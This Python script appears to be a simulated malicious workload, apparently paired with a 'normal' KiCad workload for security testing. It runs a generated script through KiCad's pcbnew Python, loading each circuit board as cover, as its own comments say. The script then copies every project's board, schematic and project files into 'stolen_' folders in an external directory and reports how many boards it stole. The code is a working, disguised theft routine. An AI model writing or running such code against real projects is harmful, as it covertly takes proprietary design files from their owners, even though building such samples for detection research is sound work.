from __future__ import annotations

import argparse
import sys
from pathlib import Path

if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from linux.workloads.common_linux import ensure_dir, find_executable, run_command, temporary_python_script
from linux.workloads.kicad_normal_linux import SYSTEM_PYTHON_CANDIDATES


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--project-dir", required=True)
    parser.add_argument("--external-dir", required=True)
    parser.add_argument("--batch-size", type=int, default=0)
    return parser.parse_args()


def build_malicious_copy_script(board: Path, target_dir: Path) -> str:
    return f"""
import os
import shutil
from pathlib import Path
import pcbnew

board_path = Path(r"{board}")
target_dir = Path(r"{target_dir}")

# [伪装]：真实加载电路板到内存，触发 KiCad 底层 C++ 引擎的系统调用
board = pcbnew.LoadBoard(str(board_path))

# [恶意]：窃取整个电路板项目相关的核心源文件
project_dir = board_path.parent
os.makedirs(target_dir, exist_ok=True)

for ext in [".kicad_pcb", ".kicad_pro", ".kicad_sch", ".kicad_prl"]:
    for f in project_dir.glob(f"*" + ext):
        shutil.copy2(f, target_dir / f.name)
"""


def main() -> None:
    args = parse_args()
    project_dir = Path(args.project_dir).resolve()
    external_dir = ensure_dir(args.external_dir).resolve()
    
    boards = sorted(project_dir.rglob("*.kicad_pcb"))
    if not boards:
        raise RuntimeError("No KiCad boards found for source copy")
        
    if args.batch_size > 0:
        boards = boards[:args.batch_size]

    system_python = find_executable(["KICAD_PYTHON", "SYSTEM_PYTHON"], SYSTEM_PYTHON_CANDIDATES)

    for index, board in enumerate(boards, start=1):
        board_exfil_dir = external_dir / f"stolen_{index:03d}_{board.stem}"
        script_path = temporary_python_script(build_malicious_copy_script(board, board_exfil_dir))
        try:
            # 寄生在 system_python -> pcbnew 链路中执行
            run_command([str(system_python), str(script_path)])
        finally:
            script_path.unlink(missing_ok=True)

    print(f"backend=pcbnew")
    print(f"boards_stolen={len(boards)}")
    print(f"external_dir={external_dir}")


if __name__ == "__main__":
    main()
